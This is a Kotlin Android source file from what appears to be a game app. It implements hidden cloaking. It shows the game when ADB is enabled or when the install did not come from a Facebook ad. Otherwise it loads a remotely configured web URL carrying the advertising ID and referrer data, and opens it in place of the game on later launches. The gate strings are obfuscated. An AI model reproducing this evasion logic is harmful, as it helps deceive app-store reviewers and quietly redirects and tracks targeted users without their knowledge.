package com.nymp.phselgy.feature_load

import android.app.Application
import android.content.Context
import android.os.RemoteException
import android.util.Base64
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.google.gson.Gson
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URLDecoder
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class NympthLoadingRepository(
    private val preferencesManager: PreferencesManager,
    private val context: Context
) {
    private val gson = Gson()

    private var data = ""
    private var nonce = ""
    private var appId = 0L

    companion object {
        const val GAID = "bvne"
        const val DATA = "gers"
        const val NONCE = "ki86"
        const val FBID = "nm74"
        const val DEEP = "fghn6"
    }

    suspend fun loadNympthGame(
        openGame: () -> Unit,
        openWeb: () -> Unit,
        adbEnabled: Boolean
    ) {
        val firstLaunch = preferencesManager.getFirstLaunch().first()

        if (!firstLaunch) {
            val http = preferencesManager.getLink().first()
            if (http.isEmpty()) {
                openGame()
            } else {
                openWeb()
            }
            return
        }
        preferencesManager.setNotFirstLaunch()

        if (adbEnabled) {
            openGame()
            return
        }

        val hung = getHung()
        if (hung == null) {
            openGame()
            return
        }
        if (hung.hung == Son.getValue("blade")) {
            openGame()
            return
        }

        val iRef = getInstallReferrer()
        val hasFb = iRef.contains("apps.facebook.com")

        if (!hasFb && !hung.volume) {
            openGame()
            return
        }
        val link = if (hasFb) {
            getDataNonce(iRef)

            if (data.isEmpty() || nonce.isEmpty()) {
                openGame()
                return
            }

            getLinkHeartOff(hung)
        } else {
            getLinkHeartOn(hung)
        }

        if (link.isEmpty()) {
            openGame()
        } else {
            preferencesManager.setLink(link)
            openWeb()
        }
    }

    private suspend fun getLinkHeartOff(hung: Hung): String {
        val gaid = getGaid()
        if (appId == 0L) {
            appId = hung.handle[0]
        }
        connectFb()

        return hung.hung +
                "?$GAID=" + gaid +
                "&$DATA=" + data +
                "&$NONCE=" + nonce +
                "&$FBID=" + appId
    }

    private suspend fun getLinkHeartOn(hung: Hung): String {
        val gaid = getGaid()
        val deep = try {
            getFbDeeps(hung.handle.ifEmpty {
                listOf(
                    697187422588215,
                    939758637533820,
                    915155586907537
                )
            }).first { it.isNotEmpty() }
        } catch (_: NoSuchElementException) {
            ""
        }

        return hung.hung +
                "?$GAID=" + gaid +
                "&$DEEP=" + deep
    }


    private suspend fun getHung(): Hung? {
        val remoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 2000
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        return try {
            val isFetchSuccessful = remoteConfig.fetchAndActivate().await()
            if (isFetchSuccessful) {
                val dataJson = remoteConfig.getString(Son.getValue("knock"))
                val data = gson.fromJson(dataJson, Hung::class.java)
                data
            } else {
                null
            }
        } catch (_: Exception) {
            null
        }
    }

    private suspend fun getInstallReferrer(): String = suspendCancellableCoroutine { continuation ->
        val referrerClient = InstallReferrerClient.newBuilder(context).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {
            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {
                        try {
                            val response = referrerClient.installReferrer
                            val referrerUrl = response.installReferrer
                            if (continuation.isActive) {
                                continuation.resume(referrerUrl)
                                referrerClient.endConnection()
                            }
                        } catch (e: RemoteException) {
                            if (continuation.isActive) {
                                continuation.resume("")
                                referrerClient.endConnection()
                            }
                        }
                    }

                    else -> {
                        if (continuation.isActive) {
                            continuation.resume("")
                            referrerClient.endConnection()
                        }
                    }
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                referrerClient.startConnection(this)
            }

        })
    }

    private fun getDataNonce(iRef: String) {
        val utmContent = URLDecoder.decode(
            iRef.substringAfter("utm_content="),
            "UTF-8"
        ) ?: ""

        try {
            val json = JSONObject(utmContent.substringBeforeLast("}") + "}")
            val source = json.getJSONObject("source")
            appId = json.optLong("app")
            data = source.optString("data") ?: ""
            nonce = source.optString("nonce") ?: ""
        } catch (_: Exception) {
            data = ""
            nonce = ""
        }
    }

    private fun connectFb() {
        FacebookSdk.setApplicationId(appId.toString())
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.sdkInitialize(context)
        FacebookSdk.fullyInitialize()
        AppEventsLogger.activateApp(context as Application)
    }

    private suspend fun getGaid(): String = withContext(Dispatchers.IO) {
        val adId = try {
            val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
            adInfo.id ?: ""
        } catch (_: Exception) {
            ""
        }
        if (adId.isNotEmpty()) OneSignal.login(adId)
        adId
    }

    private suspend fun fetchDeepLink(id: String): AppLinkData? =
        suspendCoroutine {
            FacebookSdk.setApplicationId(id)
            FacebookSdk.setAdvertiserIDCollectionEnabled(true)
            FacebookSdk.sdkInitialize(context)
            FacebookSdk.fullyInitialize()
            AppEventsLogger.activateApp(context as Application)
            AppLinkData.fetchDeferredAppLinkData(context) { appLinkData ->
                it.resume(appLinkData)
            }
        }

    private suspend fun getFbDeeps(fbIdList: List<Long>): List<String> {
        return fbIdList.map { fbId ->
            val appLinkData = fetchDeepLink(fbId.toString())
            val deep = appLinkData?.targetUri?.toString() ?: ""
            val deepLink = Base64.encodeToString(deep.toByteArray(), Base64.DEFAULT) ?: ""
            deepLink
        }
    }
}